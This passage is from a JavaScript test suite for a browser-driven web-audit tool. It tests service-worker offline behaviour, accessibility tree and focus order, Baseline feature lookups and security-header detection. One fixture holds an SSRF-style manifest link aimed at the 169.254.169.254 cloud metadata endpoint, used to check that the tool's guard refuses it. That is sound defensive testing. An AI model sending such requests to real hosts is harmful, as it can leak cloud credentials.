    // The condition map is capped, and the cap is reported rather than silent.
    // This page has no cross-origin sheet, so it also proves the complete case.
    const capped = await gather('features', `${base}/many`, { quiet: true, wait: 500 });
    assert(capped.censusComplete === true, `features: a same-origin-only page should report a complete census: ${JSON.stringify(capped.sheets)}`);
    assert(
      capped.conditionsTotal === 70 && capped.conditionsTruncated === true && Object.keys(capped.conditions).length === 60,
      `features: the condition cap was not reported: ${JSON.stringify({ total: capped.conditionsTotal, shown: Object.keys(capped.conditions).length, truncated: capped.conditionsTruncated })}`,
    );
  } finally {
    await new Promise((resolveClose) => main.close(resolveClose));
    await new Promise((resolveClose) => cross.close(resolveClose));
  }
}

// be-resilient/offline-and-installable had no evidence path: the model could
// read the manifest and nothing else. This drives the real behaviour - install a
// service worker online, then go genuinely offline and reload: once for a
// precached URL (the cached page renders), once for an uncached one in scope
// (the offline fallback renders), and once on a page with nothing resilient at
// all (the navigation fails with a net error). It also checks that CDP's worker
// list is attributed per origin, because the domain also reports the browser's
// own extension workers (web-uplift-7v3).
// A service worker registration is reported by the ServiceWorker domain asynchronously, so
// under load it can land after the navigation settle window has closed. The primitive used
// to extend its wait only when a page-origin registration had ALREADY been observed - which
// is exactly the state the race produces - so a slow registration was snapshotted as no
// service worker at all: an intermittent false negative in an audit finding
// (web-uplift-5jd). This fixture makes the race deterministic instead of waiting for
// contention to produce it: the page registers its worker after the settle window expires,
// so the registration can only be reported if the primitive waits for it.
async function testResilienceWaitsForLateServiceWorkerRegistration() {
  const swJs = [
    "self.addEventListener('install', (e) => { e.waitUntil(caches.open('late-v1').then((c) => c.addAll(['/']))); });",
    "self.addEventListener('fetch', (e) => { e.respondWith(fetch(e.request)); });",
  ].join('\n');
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    const send = (type, body) => {
      res.writeHead(200, { 'Content-Type': type });
      res.end(body);
    };
    if (path === '/sw.js') return send('text/javascript', swJs);
    if (path === '/no-worker') {
      return send('text/html', '<!doctype html><html><head><title>No worker</title></head>' +
        '<body><h1>No worker</h1></body></html>');
    }
    return send('text/html', '<!doctype html><html><head><title>Late worker</title>' +
      // 1200ms is well past the 400ms settle passed below, so the registration is
      // guaranteed to be unobserved when the settle window closes.
      '<script>setTimeout(() => navigator.serviceWorker.register("/sw.js"), 1200);</script>' +
      '</head><body><h1>Late worker</h1></body></html>');
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const base = `http://127.0.0.1:${server.address().port}`;
    // screenshots: false, matching the other resilience fixtures that assert state rather
    // than pixels: without it (or an `out` path) the primitive derives the offline
    // screenshot name from the report path and writes it into the working directory, which
    // leaves an untracked file in the checkout after every suite run.
    const result = await gather('resilience', `${base}/`, { quiet: true, wait: 400, screenshots: false });
    const regs = result.serviceWorker?.cdp?.registrations ?? [];
    assert(
      regs.some((r) => r.pageOrigin && String(r.scopeURL).startsWith(base)),
      `resilience: a registration landing after the settle window must still be reported, got ${JSON.stringify(regs)}`,
    );
    assert(
      result.serviceWorker?.scriptTextHasFetchListener === true,
      `resilience: the late worker's script must still be read, got ${JSON.stringify(result.serviceWorker)}`,
    );

    // The report has to say which of the two claims it is making. A worker observed inside
    // the window must not be recorded as an expired window (web-uplift-5jd).
    const seen = result.serviceWorker?.observation;
    assert(
      seen?.registrationObserved === true && seen?.budgetExhausted === false,
      `resilience: an observed registration must not be reported as an exhausted window, got ${JSON.stringify(seen)}`,
    );
    assert(
      seen?.budgetMs > 0 && seen?.waitedMs <= seen.budgetMs,
      `resilience: the observation window must be recorded with what was actually spent, got ${JSON.stringify(seen)}`,
    );

    // The other half of the distinction: a page with no worker at all. The primitive cannot
    // prove absence - it can only say the window closed with nothing observed - so the
    // artifact has to carry that caveat rather than leaving a reader to infer absence from
    // an empty list.
    const bare = await gather('resilience', `${base}/no-worker`, { quiet: true, wait: 400, screenshots: false });
    const unseen = bare.serviceWorker?.observation;
    assert(
      unseen?.registrationObserved === false && unseen?.budgetExhausted === true,
      `resilience: a page with no worker must be recorded as an expired window, not as an observation of one, got ${JSON.stringify(unseen)}`,
    );
    assert(
      typeof unseen?.note === 'string' && unseen.note.includes('not evidence of absence'),
      `resilience: an expired window must carry its caveat in the artifact itself, got ${JSON.stringify(unseen)}`,
    );
    assert(
      (bare.serviceWorker?.page?.registrations?.length ?? -1) === 0 &&
        bare.installabilitySignals?.serviceWorkerRegistered === false,
      `resilience: a page with no worker should still report none in the page view, got ${JSON.stringify(bare.serviceWorker?.page)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

async function testResiliencePrimitive() {
  const swJs = [
    "const CACHE = 'fixture-v1';",
    "self.addEventListener('install', (e) => { e.waitUntil(caches.open(CACHE).then((c) => c.addAll(['/', '/offline.html']))); });",
    "self.addEventListener('activate', (e) => { e.waitUntil(self.clients.claim()); });",
    'self.addEventListener(\'fetch\', (e) => {',
    // Navigations use the app-shell fallback (no network), so the fallback path
    // is deterministic offline; other requests go cache-first then network.
    "  if (e.request.mode === 'navigate') {",
    "    e.respondWith(caches.match(e.request).then((hit) => hit || caches.match('/offline.html')));",
    '    return;',
    '  }',
    "  e.respondWith(caches.match(e.request).then((hit) => hit || fetch(e.request)));",
    '});',
  ].join('\n');
  const manifest = JSON.stringify({
    name: 'Fixture App',
    short_name: 'Fixture',
    start_url: '/',
    scope: '/',
    display: 'standalone',
    theme_color: '#123456',
    icons: [
      { src: '/icon-192.png', sizes: '192x192', type: 'image/png' },
      { src: '/icon-512.png', sizes: '512x512', type: 'image/png' },
    ],
  });
  const pixel = Uint8Array.from(
    atob('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg=='),
    (c) => c.charCodeAt(0),
  );
  const swPage = (title) => `<!doctype html><html><head><title>${title}</title>` +
    '<link rel="manifest" href="/manifest.webmanifest">' +
    '<script>navigator.serviceWorker.register("/sw.js")</script></head>' +
    `<body><h1>${title}</h1><p>Fixture body content for the resilience primitive.</p></body></html>`;
  // A page-controlled manifest href must not make the privileged Node process
  // fetch a private address: the guard has to refuse it and persist nothing into
  // the report (threat model I2 / F-003, web-uplift-2kh). 169.254.169.254 is the
  // cloud metadata service.
  const evilManifestPage = '<!doctype html><html><head><title>Evil manifest</title>' +
    '<link rel="manifest" href="http://169.254.169.254/latest/meta-data/"></head>' +
    '<body><h1>Evil manifest</h1></body></html>';

  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    const send = (type, body, code = 200, extra = {}) => {
      res.writeHead(code, { 'Content-Type': type, ...extra });
      res.end(body);
    };
    if (path === '/sw.js') return send('text/javascript', swJs);
    if (path === '/manifest.webmanifest') return send('application/manifest+json', manifest);
    if (path === '/offline.html') {
      return send('text/html', '<!doctype html><html><head><title>Offline fallback</title></head>' +
        '<body><h1>Offline fallback</h1><p>Cached by the service worker.</p></body></html>');
    }
    if (path.startsWith('/icon-')) return send('image/png', pixel);
    if (path === '/favicon.ico') {
      res.writeHead(204);
      res.end();
      return;
    }
    if (path === '/no-sw') {
      return send('text/html', '<!doctype html><html><head><title>No service worker</title></head>' +
        '<body><h1>No service worker</h1><p>Nothing resilient here.</p></body></html>');
    }
    if (path === '/evil-manifest') return send('text/html', evilManifestPage);
    // no-store, so the browser's HTTP cache cannot quietly stand in for the
    // service worker's fallback: offline emulation still serves cache hits.
    if (path === '/uncached-sw') return send('text/html', swPage('Uncached page with service worker'), 200, { 'Cache-Control': 'no-store' });
    return send('text/html', swPage('Fixture with service worker'));
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;
    const out = join(tmp, 'resilience-sw.json');

    const withSw = await gather('resilience', `${base}/`, { quiet: true, wait: 800, out });
    assert(
      withSw.manifest.found === true && withSw.manifest.fields?.name === 'Fixture App' && withSw.manifest.icons.length === 2,
      `resilience: the manifest was not resolved with its fields: ${JSON.stringify(withSw.manifest)}`,
    );
    assert(
      withSw.serviceWorker.scriptTextHasFetchListener === true,
      `resilience: the fetch listener was not read from the worker script: ${JSON.stringify(withSw.serviceWorker)}`,
    );
    assert(
      withSw.serviceWorker.page.controller?.endsWith('/sw.js') === true,
      `resilience: the page should report its controller: ${JSON.stringify(withSw.serviceWorker.page)}`,
    );
    const cdpRegs = withSw.serviceWorker.cdp.registrations;
    assert(
      cdpRegs.some((r) => r.pageOrigin && r.scopeURL.startsWith(base)),
      `resilience: the page-origin registration should be in the CDP list: ${JSON.stringify(cdpRegs)}`,
    );
    assert(
      cdpRegs.some((r) => !r.pageOrigin),
      `resilience: the browser's own workers must be marked as not this origin: ${JSON.stringify(cdpRegs)}`,
    );
    const signals = withSw.installabilitySignals;
    assert(
      signals.secureContext === true && signals.manifestResolved === true && signals.hasName === true &&
        signals.has192Icon === true && signals.has512Icon === true && signals.displayStandaloneish === true &&
        signals.serviceWorkerRegistered === true && signals.serviceWorkerHasFetchListener === true,
      `resilience: installability signals are wrong: ${JSON.stringify(signals)}`,
    );

    // Offline: the precached URL renders from cache, controlled by the worker,
    // and the legible artifact is on disk.
    assert(
      withSw.offline.navigationFailed === false && withSw.offline.rendered?.title === 'Fixture with service worker',
      `resilience: the precached page should render offline: ${JSON.stringify(withSw.offline)}`,
    );
    assert(
      withSw.offline.rendered.controlled === true,
      `resilience: the offline render should be under the worker's control: ${JSON.stringify(withSw.offline.rendered)}`,
    );
    assert(
      typeof withSw.offline.screenshot === 'string' && statSync(withSw.offline.screenshot).size > 0,
      `resilience: the offline screenshot should exist: ${withSw.offline.screenshot}`,
    );

    // An uncached URL inside the worker's scope falls back to the offline page.
    const fallback = await gather('resilience', `${base}/uncached-sw`, { quiet: true, wait: 800, screenshots: false });
    assert(
      fallback.offline.navigationFailed === false && fallback.offline.rendered?.title === 'Offline fallback',
      `resilience: an uncached URL should render the fallback: ${JSON.stringify(fallback.offline)}`,
    );

    // Nothing resilient: the offline navigation fails and says why.
    const bare = await gather('resilience', `${base}/no-sw`, { quiet: true, wait: 500, screenshots: false });
    assert(
      bare.serviceWorker.page.registrations.length === 0 && bare.installabilitySignals.serviceWorkerRegistered === false,
      `resilience: a page without a worker should report none: ${JSON.stringify(bare.serviceWorker)}`,
    );
    assert(
      bare.manifest.found === false && bare.installabilitySignals.manifestResolved === false,
      `resilience: a page without a manifest should report none: ${JSON.stringify(bare.manifest)}`,
    );
    assert(
      bare.offline.navigationFailed === true && typeof bare.offline.errorText === 'string' && bare.offline.rendered === null,
      `resilience: offline navigation should fail with a net error: ${JSON.stringify(bare.offline)}`,
    );

    // A page-controlled manifest href pointing at a private address must be
    // refused by the guard, with no body persisted into the evidence.
    const evil = await gather('resilience', `${base}/evil-manifest`, { quiet: true, wait: 300, screenshots: false });
    assert(
      evil.manifest.found === false &&
        evil.manifest.data === null &&
        /refused:/.test(String(evil.manifest.fetchError)) &&
        evil.installabilitySignals.manifestResolved === false,
      `resilience: a manifest href pointing at a private address must be refused with nothing persisted: ${JSON.stringify(evil.manifest)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// be-inclusive/names-roles-labels and structure-and-focus cannot be judged from
// DOM attributes alone: aria-labelledby overrides aria-label, a name can come
// from title, and a subtree hidden by aria-hidden is still in the tab order.
// This drives the computed AX tree and the real tab order (web-uplift-5lp).
async function testA11yTreePrimitive() {
  const page = [
    '<!doctype html><html lang="en"><head><title>a11y fixture</title><style>',
    '  body { margin: 0; font-family: sans-serif; }',
    '  button, input, a { display: inline-block; margin: 4px; }',
    '  .no-outline:focus { outline: none; }',
    '  .visible:focus { outline: 3px solid #f00; }',
    '</style></head><body>',
    '<header><h1>Accessibility fixture</h1></header>',
    '<nav aria-label="Main navigation"><a href="#1" id="first" class="visible">One</a><a href="#2" id="second">Two</a></nav>',
    '<main>',
    '<button id="labelled" aria-label="Ignored label" aria-labelledby="lbl">x</button><span id="lbl">Labelled by text</span>',
    '<button id="titled" title="Name from title"></button>',
    '<button id="no-outline" class="no-outline">No outline</button>',
    '<div aria-hidden="true"><button id="hidden-button">Hidden button</button></div>',
    '<a href="#skipped" id="tabindex-minus" tabindex="-1">Not in tab order</a>',
    '<input id="email" type="email" aria-label="Email address">',
    '<h2 id="heading-2">Section</h2>',
    '</main>',
    '<footer><a href="#3" id="third">Three</a></footer>',
    '</body></html>',
  ].join('\n');

  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(page);
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const result = await gather('a11ytree', `http://127.0.0.1:${port}/`, { quiet: true, wait: 600 });

    const flat = [];
    const walk = (n) => {
      if (!n) return;
      flat.push(n);
      for (const child of n.children || []) walk(child);
    };
    walk(result.tree.root);
    const accessible = flat.filter((n) => !n.ignored);
    const named = (role, name) => accessible.find((n) => n.role === role && n.name === name);

    assert(
      named('navigation', 'Main navigation') && named('main') && named('contentinfo'),
      `a11ytree: landmark roles/names missing from the computed tree: ${JSON.stringify(result.tree.roleCounts)}`,
    );
    assert(
      !!named('button', 'Labelled by text'),
      `a11ytree: aria-labelledby should win over aria-label in the computed name: ${JSON.stringify(accessible.filter((n) => n.role === 'button'))}`,
    );
    assert(
      !!named('button', 'Name from title'),
      `a11ytree: a name coming from title should appear in the computed tree: ${JSON.stringify(accessible.filter((n) => n.role === 'button'))}`,
    );
    assert(
      !accessible.some((n) => n.role === 'button' && n.name === 'Hidden button'),
      'a11ytree: a button inside aria-hidden must not be exposed as an accessible button',
    );
    assert(result.tree.ignoredCount >= 1, `a11ytree: the aria-hidden subtree should be ignored: ${result.tree.ignoredCount}`);
    assert(
      result.tree.truncated === false && result.tree.maxDepth >= 3 && result.tree.totalNodes > 10,
      `a11ytree: the tree census looks wrong: ${JSON.stringify({ total: result.tree.totalNodes, projected: result.tree.nodesProjected, depth: result.tree.maxDepth })}`,
    );
    assert(
      result.tree.maxNodes === 400 && result.focusOrder.maxStops === 60,
      `a11ytree: the effective caps should be reported: ${JSON.stringify({ maxNodes: result.tree.maxNodes, maxStops: result.focusOrder.maxStops })}`,
    );

    // The real tab order: DOM order, tabindex=-1 skipped, and aria-hidden content
    // still reachable (which the tree says is hidden).
    const ids = result.focusOrder.stops.filter((s) => !s.isBody).map((s) => s.id);
    assert(
      JSON.stringify(ids) === JSON.stringify(['first', 'second', 'labelled', 'titled', 'no-outline', 'hidden-button', 'email', 'third']),
      `a11ytree: focus order is wrong: ${JSON.stringify(ids)}`,
    );
    assert(
      !ids.includes('tabindex-minus'),
      `a11ytree: tabindex=-1 must stay out of the tab order: ${JSON.stringify(ids)}`,
    );
    assert(
      result.focusOrder.stopsInsideAriaHidden === 1 && result.focusOrder.stops.some((s) => s.id === 'hidden-button' && s.insideAriaHidden === true),
      `a11ytree: the focusable element inside aria-hidden should be recorded as such: ${JSON.stringify(result.focusOrder.stops.map((s) => [s.id, s.insideAriaHidden]))}`,
    );
    assert(result.focusOrder.cycleDetected === true, 'a11ytree: the walk should detect the tab cycle wrapping');

    // Focus indicators: the author-suppressed one reads as none, the styled one
    // as visible.
    const noOutline = result.focusOrder.stops.find((s) => s.id === 'no-outline');
    const firstStop = result.focusOrder.stops.find((s) => s.id === 'first');
    assert(
      noOutline?.hasVisibleIndicator === false && noOutline.outline.style === 'none',
      `a11ytree: outline:none should read as no visible indicator: ${JSON.stringify(noOutline)}`,
    );
    assert(
      firstStop?.hasVisibleIndicator === true,
      `a11ytree: a 3px outline should read as a visible indicator: ${JSON.stringify(firstStop)}`,
    );

    // The caps are the model's to widen, and a widened or lowered cap is echoed
    // in the output rather than applied silently.
    const narrowCaps = await gather('a11ytree', `http://127.0.0.1:${port}/`, { quiet: true, wait: 400, maxNodes: 5, maxStops: 2 });
    assert(
      narrowCaps.tree.maxNodes === 5 && narrowCaps.tree.nodesProjected <= 5 && narrowCaps.tree.truncated === true,
      `a11ytree: --max-nodes should cap the projection and say so: ${JSON.stringify({ maxNodes: narrowCaps.tree.maxNodes, projected: narrowCaps.tree.nodesProjected, truncated: narrowCaps.tree.truncated })}`,
    );
    assert(
      narrowCaps.focusOrder.maxStops === 2 && narrowCaps.focusOrder.stopCount === 2 && narrowCaps.focusOrder.truncated === true,
      `a11ytree: --max-stops should cap the walk and say so: ${JSON.stringify({ maxStops: narrowCaps.focusOrder.maxStops, stops: narrowCaps.focusOrder.stopCount, truncated: narrowCaps.focusOrder.truncated })}`,
    );

    // A bad value must fall back to the documented default rather than
    // producing an empty tree.
    const badCaps = await gather('a11ytree', `http://127.0.0.1:${port}/`, { quiet: true, wait: 400, maxNodes: 0, maxStops: Number.NaN });
    assert(
      badCaps.tree.maxNodes === 400 && badCaps.focusOrder.maxStops === 60 && badCaps.tree.nodesProjected > 5,
      `a11ytree: invalid caps should fall back to the defaults: ${JSON.stringify({ maxNodes: badCaps.tree.maxNodes, maxStops: badCaps.focusOrder.maxStops, projected: badCaps.tree.nodesProjected })}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

async function testBaselineOracle() {
  const { lookupBaseline, formatBaseline } = await import('../knowledge/baseline.mjs');

  // 1. Exact ID lookup
  const newly = lookupBaseline('light-dark');
  assert(newly.found === true, 'baseline: light-dark should be found');
  assert(newly.id === 'light-dark' && newly.status === 'newly', 'baseline: light-dark should be newly available');
  assert(newly.featureId === 'light-dark' && newly.featureName === 'light-dark()', 'baseline: schema aliases featureId/featureName must be present');
  assert(newly.fallbackMandatory === true, 'baseline: newly available should mandate a fallback');
  assert(newly.lowDate === '2024-05-13', `baseline: lowDate for light-dark should be 2024-05-13, got ${newly.lowDate}`);

  const widely = lookupBaseline('color-scheme');
  assert(widely.found === true, 'baseline: color-scheme should be found');
  assert(widely.status === 'widely' && widely.fallbackMandatory === false, 'baseline: color-scheme should be widely available');
  assert(widely.highDate === '2024-08-03', `baseline: highDate for color-scheme should be 2024-08-03, got ${widely.highDate}`);

  // 2. BCD compat key lookup & property suffix
  const anchor = lookupBaseline('position-anchor');
  assert(anchor.found === true && anchor.id === 'anchor-positioning', 'baseline: position-anchor should resolve to anchor-positioning');
  assert(anchor.status === 'limited' && anchor.fallbackMandatory === true, 'baseline: anchor-positioning should be limited');

  const fullBcd = lookupBaseline('css.properties.position-anchor');
  assert(fullBcd.found === true && fullBcd.id === 'anchor-positioning', 'baseline: full BCD key should resolve');

  // 3. Name lookup & parenthesis tolerance
  const byName = lookupBaseline('Anchor positioning');
  assert(byName.found === true && byName.id === 'anchor-positioning', 'baseline: lookup by name should resolve');
  const withParens = lookupBaseline('light-dark()');
  assert(withParens.found === true && withParens.id === 'light-dark', 'baseline: query with () should resolve');

  // 4. Symbol forms (@container, :has, :popover-open, ::part)
  const container = lookupBaseline('@container');
  assert(container.found === true && container.id === 'container-queries', 'baseline: @container should resolve to container-queries');
  assert(container.status === 'widely' && container.fallbackMandatory === false, 'baseline: container-queries should be widely available');

  const has = lookupBaseline(':has');
  assert(has.found === true && has.id === 'has', 'baseline: :has should resolve to has');
  assert(has.status === 'widely', 'baseline: :has should be widely available');

  const popover = lookupBaseline(':popover-open');
  assert(popover.found === true && popover.id === 'popover', 'baseline: :popover-open should resolve to popover');
  assert(popover.status === 'newly' && popover.fallbackMandatory === true, 'baseline: popover should be newly available with mandatory fallback');

  // 5. Ambiguous short keys resolve to CSS types first, not data-order collisions
  const min = lookupBaseline('min');
  assert(min.found === true && min.id === 'min-max-clamp', `baseline: min should resolve to min-max-clamp, got ${min.id}`);
  assert(min.status === 'widely', 'baseline: min-max-clamp should be widely available');

  const max = lookupBaseline('max');
  assert(max.found === true && max.id === 'min-max-clamp', `baseline: max should resolve to min-max-clamp, got ${max.id}`);

  // 6. Redirect resolution (single and plural targets)
  const redirect = lookupBaseline('masonry');
  assert(redirect.found === true && redirect.id === 'grid-lanes', 'baseline: masonry should resolve to grid-lanes');
  assert(redirect.redirectedFrom === 'masonry', 'baseline: redirectedFrom should record the alias');

  const pluralRedirect = lookupBaseline('text-wrap-style');
  assert(pluralRedirect.found === true && pluralRedirect.id === 'text-wrap-style', 'baseline: text-wrap-style should be found');
  assert(Array.isArray(pluralRedirect.targets) && pluralRedirect.targets.length === 3, 'baseline: text-wrap-style should have 3 targets');
  assert(pluralRedirect.status === 'limited' && pluralRedirect.fallbackMandatory === true, 'baseline: split feature with limited targets must be limited with mandatory fallback');
  const formattedPlural = formatBaseline(pluralRedirect);
  assert(formattedPlural.includes('text-wrap: pretty') && formattedPlural.includes('Limited availability'), 'baseline: format plural should show individual target statuses');

  // 7. Unknown query & suggestions
  const unknown = lookupBaseline('non-existent-xyz-feature');
  assert(unknown.found === false, 'baseline: unknown feature should return found=false');

  const formattedUnknown = formatBaseline(unknown);
  assert(formattedUnknown.includes('Unknown web platform feature "non-existent-xyz-feature"'), 'baseline: format unknown should name feature');

  // 8. CLI execution: bin/web-uplift.mjs baseline <query> [--json]
  const jsonRun = run(process.execPath, ['bin/web-uplift.mjs', 'baseline', 'light-dark', '--json']);
  assert(jsonRun.status === 0, `baseline CLI: json run failed:\n${jsonRun.stderr}`);
  const parsedJson = JSON.parse(jsonRun.stdout);
  assert(parsedJson.id === 'light-dark' && parsedJson.featureId === 'light-dark' && parsedJson.status === 'newly', 'baseline CLI: json output mismatch');

  const textRun = run(process.execPath, ['bin/web-uplift.mjs', 'baseline', 'color-scheme']);
  assert(textRun.status === 0, `baseline CLI: text run failed:\n${textRun.stderr}`);
  assert(textRun.stdout.includes('Baseline Widely available') && textRun.stdout.includes('Fallback: optional'),
    `baseline CLI: text output unexpected:\n${textRun.stdout}`);

  const symbolRun = run(process.execPath, ['bin/web-uplift.mjs', 'baseline', '@container']);
  assert(symbolRun.status === 0 && symbolRun.stdout.includes('container-queries'),
    `baseline CLI: @container run failed:\n${symbolRun.stdout}`);

  const badRun = run(process.execPath, ['bin/web-uplift.mjs', 'baseline', 'non-existent-xyz-feature']);
  assert(badRun.status === 1, `baseline CLI: bad query should exit 1, got ${badRun.status}`);
  assert(badRun.stderr.includes('Unknown web platform feature'), `baseline CLI: bad query should log error to stderr:\n${badRun.stderr}`);
}

async function testFlowNormalize() {
  const { normalizeFlow } = await import('../runner/flow.mjs');

  // A Chrome DevTools Recorder export normalises cleanly (same shape we use).
  const recorderJson = {
    title: 'Search',
    steps: [
      { type: 'setViewport', width: 1200, height: 800 },
      { type: 'navigate', url: 'https://example.com/' },
      { type: 'click', selectors: [['aria/Search'], ['#go']], target: 'main' },
      null, // stray/empty entries are dropped
    ],
  };
  const flow = normalizeFlow(recorderJson);
  assert(flow.title === 'Search', 'flow: title should carry through');
  assert(flow.steps.length === 3, `flow: empty steps should be dropped, got ${flow.steps.length}`);
  assert(flow.steps[2].selectors[0][0] === 'aria/Search', 'flow: selectors preserved');

  // Not-a-flow inputs throw.
  let threw = false;
  try { normalizeFlow({ nope: true }); } catch { threw = true; }
  assert(threw, 'flow: an object without steps[] must throw');
}

function run(command, args, opts = {}) {
  return spawnSync(command, args, {
    cwd: repoRoot,
    encoding: 'utf8',
    ...opts,
  });
}

// Async variant: spawnSync would block this process's event loop, so an
// in-process test server could not answer the child's browser. Bounded so a
// hung browser fails the suite instead of hanging it.
function runAsync(command, args, opts = {}) {
  return new Promise((resolvePromise) => {
    const child = spawn(command, args, { cwd: repoRoot, timeout: 120000, ...opts });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (chunk) => { stdout += chunk; });
    child.stderr.on('data', (chunk) => { stderr += chunk; });
    child.on('close', (status) => resolvePromise({ status, stdout, stderr }));
  });
}

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

// The Chrome bootstrap was flaky in CI: a bare CDP({ port }) relied on a
// default page target that Chrome for Testing 154 sometimes does not provide.
// Keep a cheap (3-iteration) launch+newSession loop in the suite so a
// regression fails fast instead of surfacing as a random mid-suite death.
async function testLaunchSessionLoop() {
  const result = await runAsync(process.execPath, [join(repoRoot, 'tests', 'launch-loop.mjs'), '3']);
  assert(result.status === 0, `launch-session loop failed:
${result.stderr || result.stdout}`);
}

// Deterministic teardown guard (web-uplift-knz): every browser the harness
// launches must be fully gone (process tree AND profile dir) after close().
// The launcher used to leave a wedged browser group and one /tmp/web-uplift-cdp-*
// husk per boot, which the (now stopped) VM reaper had to clean up. Kept cheap:
// one browser in the suite; the standalone default is three.
async function testNoOrphanBrowser() {
  const result = await runAsync(process.execPath, [join(repoRoot, 'tests', 'no-orphan-browser.mjs'), '1']);
  assert(result.status === 0, `no-orphan-browser failed:
${result.stderr || result.stdout}`);
}

function testSyntaxChecks() {
  for (const file of listFiles(repoRoot, (p) => p.endsWith('.mjs'))) {
    const result = run(process.execPath, ['--check', file]);
    assert(result.status === 0, `syntax check failed for ${file}:\n${result.stderr || result.stdout}`);
  }
}

function testPackageRootImportIsSideEffectFree() {
  const result = run(process.execPath, [
    '--input-type=module',
    '-e',
    "import 'web-uplift'; console.log('import-ok')",
  ]);
  assert(result.status === 0, `package root import failed:\n${result.stderr || result.stdout}`);
  assert(result.stdout.trim() === 'import-ok', `package root import produced side effects:\n${result.stdout}`);
}

function testSchemaValidation() {
  const ajv = new Ajv2020({ allErrors: true, strict: false });
  addFormats(ajv);

  const configSchema = readJson('schema/config.schema.json');
  const findingsSchema = readJson('schema/findings.schema.json');
  ajv.compile(configSchema);
  ajv.compile(findingsSchema);

  validateJson(ajv, configSchema, 'web-uplift.json');
  validateJson(ajv, configSchema, 'web-uplift.example.json');
  validateJson(ajv, findingsSchema, 'examples/playground-report.json');
  validateJson(ajv, findingsSchema, 'examples/playground-report-fixed.json');
}

// The headers primitive reads a site's security response headers, and header names
// are case-insensitive (RFC 9110): Chrome hands them over as the server sent them, so
// an HTTP/1.1 response arrives capitalised and an HTTP/2 one lowercased. The lookup
// used to be lowercase-only, which made every capitalised response report all six
// headers as missing - a false negative written into the tool's own security
// evidence. This drives the real primitive over both wire shapes and checks that a
// header the response does not send still reads as absent, so the fix cannot be
// over-broad (web-uplift-0w6).
async function testHeadersPrimitiveFindsHeadersRegardlessOfNameCase() {
  const page = (title) =>
    `<!doctype html><html lang="en"><head><title>${title}</title></head><body><main><h1>${title}</h1></main></body></html>`;
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/caps') {
      // HTTP/1.1 wire shape: Node writes header names exactly as given.
      res.writeHead(200, {
        'Content-Type': 'text/html',
        'Content-Security-Policy': "default-src 'self'",
        'Strict-Transport-Security': 'max-age=63072000',
      });
      res.end(page('caps'));
      return;
    }
    if (path === '/lower') {
      // The shape HTTP/2 delivers: the case that already worked, kept as a
      // regression guard in the other direction.
      res.writeHead(200, {
        'content-type': 'text/html',
        'content-security-policy': "default-src 'self'",
        'x-content-type-options': 'nosniff',
      });
      res.end(page('lower'));
      return;
    }
    if (path === '/empty') {
      // Present but empty protects nothing: it must read as its own state, not as
      // absent and not as a pass.
      res.setHeader('Content-Security-Policy', '');
      res.setHeader('Referrer-Policy', '');
      res.setHeader('Strict-Transport-Security', 'max-age=63072000');
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(page('empty'));
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(page('bare'));
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;
    // Prove the fixtures carry the casing each case is about: res.rawHeaders keeps
    // the wire casing, while res.headers is lowercased by Node itself and would
    // prove nothing here.
    const wireNames = async (path) =>
      new Promise((resolve, reject) => {
        const request = http.get(`${base}${path}`, (res) => {
          const names = res.rawHeaders.filter((_, index) => index % 2 === 0);
          res.resume();
          resolve(names);
        });
        request.on('error', reject);
      });
    assert(
      (await wireNames('/caps')).includes('Content-Security-Policy'),
      'the HTTP/1.1 fixture must really send a capitalised header name',
    );
    assert(
      (await wireNames('/lower')).includes('content-security-policy'),
      'the lowercase fixture must really send a lowercase header name',
    );

    const caps = await gather('headers', `${base}/caps`, { quiet: true, wait: 400 });
    assert(
      caps.securityHeaders['content-security-policy'].present === true,
      `a capitalised response header must be found: ${JSON.stringify(caps.securityHeaders['content-security-policy'])}`,
    );
    assert(
      caps.securityHeaders['content-security-policy'].value === "default-src 'self'",
      `the header value must survive the normalisation: ${JSON.stringify(caps.securityHeaders['content-security-policy'])}`,
    );
    assert(
      caps.securityHeaders['strict-transport-security'].present === true,
      `a capitalised HSTS header must be found: ${JSON.stringify(caps.securityHeaders['strict-transport-security'])}`,
    );
    assert(
      caps.securityHeaders['x-frame-options'].present === false,
      `a header the response does not send must still read as absent: ${JSON.stringify(caps.securityHeaders['x-frame-options'])}`,
    );

    const lower = await gather('headers', `${base}/lower`, { quiet: true, wait: 400 });
    assert(
      lower.securityHeaders['content-security-policy'].present === true,
      `a lowercase response header must still be found: ${JSON.stringify(lower.securityHeaders['content-security-policy'])}`,
    );
    assert(
      lower.securityHeaders['x-content-type-options'].present === true,
      `a lowercase nosniff header must still be found: ${JSON.stringify(lower.securityHeaders['x-content-type-options'])}`,
    );

    const bare = await gather('headers', `${base}/bare`, { quiet: true, wait: 400 });
    assert(
      bare.securityHeaders['content-security-policy'].present === false &&
        bare.securityHeaders['strict-transport-security'].present === false,
      `a response that sends no security headers must report none: ${JSON.stringify(bare.securityHeaders)}`,
    );

    // Present-but-empty is a third state. Reading it as absent would be the false
    // negative this bead fixed; reading it as a pass would be false assurance - an
    // empty security header protects nothing.
    const empty = await gather('headers', `${base}/empty`, { quiet: true, wait: 400 });
    const emptyCsp = empty.securityHeaders['content-security-policy'];
